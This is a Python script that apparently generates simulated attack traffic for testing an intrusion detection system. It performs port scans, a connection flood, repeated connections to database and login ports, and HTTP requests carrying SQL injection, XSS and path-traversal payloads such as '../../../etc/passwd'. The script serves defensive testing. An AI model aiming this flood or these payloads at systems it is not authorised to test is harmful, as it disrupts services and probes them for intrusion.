#!/usr/bin/env python3
"""
IDS Attacker - Simulates attack traffic for IDS testing.
Designed to run on AWS EC2 t3.small (separate from IDS infrastructure).

Usage:
    python attacker.py --target 10.0.1.50
    TARGET_IP=10.0.1.50 python attacker.py --mode portscan
    python attacker.py --target <VICTIM_PRIVATE_IP> --mode all

Environment:
    TARGET_IP    - Victim/target IP (required if not passed via --target)
    TARGET_PORT  - For single-mode attacks (default: 80 for http, 22 for ssh)
    DURATION     - Run duration in seconds for continuous modes (default: 60)
    INTERVAL     - Delay between requests in ms (default: 100)
"""

import argparse
import os
import random
import socket
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# Common ports to scan (map to service names for IDS rules)
COMMON_PORTS = [
    (22, "SSH"),
    (23, "Telnet"),
    (80, "HTTP"),
    (443, "HTTPS"),
    (3306, "MySQL"),
    (3389, "RDP"),
    (5432, "PostgreSQL"),
    (445, "SMB"),
    (1433, "MSSQL"),
    (6379, "Redis"),
    (27017, "MongoDB"),
    (8080, "HTTP-Alt"),
    (8443, "HTTPS-Alt"),
]

# SQL injection payloads (for HTTP-based detection)
SQLI_PAYLOADS = [
    "1' OR '1'='1",
    "1; DROP TABLE users--",
    "1 UNION SELECT * FROM users",
    "' OR 1=1--",
    "admin'--",
    "1' AND '1'='1",
    "' OR ''='",
]

# XSS payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "javascript:alert(1)",
    "<img src=x onerror=alert(1)>",
]

# Path traversal
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
]


def port_scan(target_ip: str, ports: list = None, timeout: float = 2.0) -> int:
    """Perform a port scan. Returns number of connections attempted."""
    ports = ports or [p for p, _ in COMMON_PORTS]
    attempt_count = 0

    def try_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((target_ip, port))
            sock.close()
            return 1
        except (socket.error, OSError):
            return 1

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(try_port, p) for p in ports]
        attempt_count = sum(f.result() for f in as_completed(futures))

    return attempt_count


def connection_flood(target_ip: str, port: int, duration: int, interval_ms: float) -> int:
    """Open many rapid connections (simulates connection flood / DoS)."""
    end_time = time.time() + duration
    count = 0

    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            sock.connect_ex((target_ip, port))
            sock.close()
        except (socket.error, OSError):
            pass
        count += 1
        if interval_ms > 0:
            time.sleep(interval_ms / 1000.0)

    return count


def brute_force_simulation(target_ip: str, duration: int) -> int:
    """Simulate brute force - many connection attempts to SSH/MySQL/RDP etc."""
    ports = [22, 3306, 3389, 5432]
    end_time = time.time() + duration
    count = 0

    while time.time() < end_time:
        port = random.choice(ports)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            sock.connect_ex((target_ip, port))
            sock.close()
        except (socket.error, OSError):
            pass
        count += 1
        time.sleep(0.05)

    return count


def http_attack(target_ip: str, port: int, duration: int) -> int:
    """Send HTTP requests with malicious payloads (SQLi, XSS, path traversal)."""
    if not HAS_REQUESTS:
        print("  [SKIP] requests not installed. Run: pip install requests")
        return 0

    base_url = f"http://{target_ip}:{port}"
    all_payloads = (
        [(p, "sqli") for p in SQLI_PAYLOADS]
        + [(p, "xss") for p in XSS_PAYLOADS]
        + [(p, "lfi") for p in TRAVERSAL_PAYLOADS]
    )

    end_time = time.time() + duration
    count = 0

    while time.time() < end_time:
        payload, _ = random.choice(all_payloads)
        try:
            requests.get(
                f"{base_url}/?q={payload}",
                timeout=2,
                headers={"User-Agent": "IDS-Attacker/1.0"},
            )
        except requests.RequestException:
            pass
        count += 1
        time.sleep(0.2)

    return count


def run_mode(mode: str, target_ip: str, target_port: int, duration: int, interval_ms: float) -> dict:
    """Run specified attack mode and return stats."""
    results = {"mode": mode, "target": target_ip, "count": 0, "elapsed": 0}

    start = time.time()

    if mode == "portscan":
        count = port_scan(target_ip)
        results["count"] = count
        print(f"  Port scan: {count} port probes sent")
    elif mode == "flood":
        count = connection_flood(target_ip, target_port, duration, interval_ms)
        results["count"] = count
        results["port"] = target_port
        print(f"  Connection flood: {count} connections to port {target_port}")
    elif mode == "bruteforce":
        count = brute_force_simulation(target_ip, duration)
        results["count"] = count
        print(f"  Brute force sim: {count} connection attempts")
    elif mode == "http":
        count = http_attack(target_ip, target_port, duration)
        results["count"] = count
        results["port"] = target_port
        print(f"  HTTP attacks: {count} malicious requests to port {target_port}")
    elif mode == "all":
        # Run all modes in sequence
        total = 0
        total += port_scan(target_ip)
        print("  Port scan complete")
        total += connection_flood(target_ip, 80, min(10, duration), 10)
        print("  Connection flood complete")
        total += brute_force_simulation(target_ip, min(15, duration))
        print("  Brute force sim complete")
        if HAS_REQUESTS:
            total += http_attack(target_ip, 80, min(10, duration))
            print("  HTTP attacks complete")
        results["count"] = total
    else:
        raise ValueError(f"Unknown mode: {mode}")

    results["elapsed"] = round(time.time() - start, 2)
    return results


def main():
    parser = argparse.ArgumentParser(
        description="IDS Attacker - Simulates attack traffic for IDS testing"
    )
    parser.add_argument(
        "--target", "-t",
        default=os.environ.get("TARGET_IP"),
        help="Target/victim IP address",
    )
    parser.add_argument(
        "--port", "-p",
        type=int,
        default=int(os.environ.get("TARGET_PORT", "80")),
        help="Target port (for flood, http modes)",
    )
    parser.add_argument(
        "--mode", "-m",
        choices=["portscan", "flood", "bruteforce", "http", "all"],
        default="all",
        help="Attack mode",
    )
    parser.add_argument(
        "--duration", "-d",
        type=int,
        default=int(os.environ.get("DURATION", "60")),
        help="Run duration in seconds (for flood, bruteforce, http)",
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=float(os.environ.get("INTERVAL", "10")),
        help="Interval between requests in ms (for flood)",
    )
    parser.add_argument(
        "--loop",
        type=int,
        default=1,
        help="Number of times to run (0 = infinite until Ctrl+C)",
    )
    args = parser.parse_args()

    if not args.target:
        print("Error: TARGET_IP required. Set TARGET_IP env var or use --target", file=sys.stderr)
        sys.exit(1)

    print(f"\nIDS Attacker")
    print(f"  Target: {args.target}")
    print(f"  Mode:   {args.mode}")
    print(f"  Duration: {args.duration}s")
    print()

    iteration = 0
    try:
        while args.loop == 0 or iteration < args.loop:
            iteration += 1
            if args.loop > 1 or args.loop == 0:
                print(f"--- Iteration {iteration} ---")

            result = run_mode(
                args.mode,
                args.target,
                args.port,
                args.duration,
                args.interval,
            )
            print(f"  Completed: {result['count']} operations in {result['elapsed']}s\n")

            if args.loop > 0 and iteration < args.loop:
                time.sleep(2)
    except KeyboardInterrupt:
        print("\nStopped by user")

    print("Done.")


if __name__ == "__main__":
    main()
